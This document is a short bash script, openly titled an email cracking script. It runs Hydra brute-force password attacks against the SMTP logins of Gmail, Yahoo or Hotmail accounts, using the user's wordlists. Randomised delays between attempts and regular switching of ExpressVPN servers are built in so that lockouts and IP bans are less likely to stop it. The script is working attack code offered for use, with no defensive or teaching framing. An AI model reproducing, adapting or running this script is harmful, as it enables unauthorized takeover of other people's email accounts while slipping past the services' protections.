#! /bin/bash

echo Simple Email Cracking Script in bash
echo Written By: Alan Cao
echo NOTE: Make sure you have wordlists!
echo Let us Begin:
echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
read smtp
echo Enter Email Address:
read email
echo Provide Directory of Wordlist for Passwords:
read search_dir

let "sleepTime = 120"
let "cpt = 0"
let "curSleepTime = 120"

curVpn='nlro'

expressvpn disconnect
expressvpn connect $curVpn

########################################################################################
#
# SLOW RANDOM 
# Hydra attempts interval 1-3s 
# 50 attemps interval 60-120s
# 100 attemps interval 180-300s
# 200 attemps interval 420-540s + change vpn 
#
#######################################################################################
for entry in "$search_dir"/*
do
  let "cpt = cpt + 1"
  let "hydraTime =  (RANDOM%3+1)"
  echo "FICHER EN COURS DE TRAITEMENT..... $entry" 
  hydra -S -l $email -P $entry -V -s 465 -t 1 -c 1 -o results  $smtp smtp 
  if [ $cpt = 1 ]
  then
    let "curSleepTime = (RANDOM % (120 - 90 + 1 ) + 90 )"
  elif [ $cpt =  2 ]
  then
    let "curSleepTime = (RANDOM % (1800 - 1500 + 1 ) +1500 )"
    expressvpn disconnect
    let "vpnNumber = (RANDOM % (3 - 1 + 1 ) + 1 )"
    if [ $vpnNumber = 1 ]  && [ $curVpn != "nlro" ]
    then
	curVpn='nlro'
    elif [ $vpnNumber = 2 ] && [ $curVpn != "nlanm2" ]
    then
       curVpn='nlam2'
    elif [ $vpnNumber = 3 ]&& [ $curVpn != "nlam" ]
    then 
      curVpn='nlam'
    else
      curVpn='gr1'
    fi
    expressvpn connect $curVpn
    let "cpt = 0"
  else
    let "curSleepTime = (RANDOM % (90 - 60 + 1 ) + 60 )"
  fi
  echo "SLEEP DURING ....... : $curSleepTime "
  sleep $curSleepTime
done
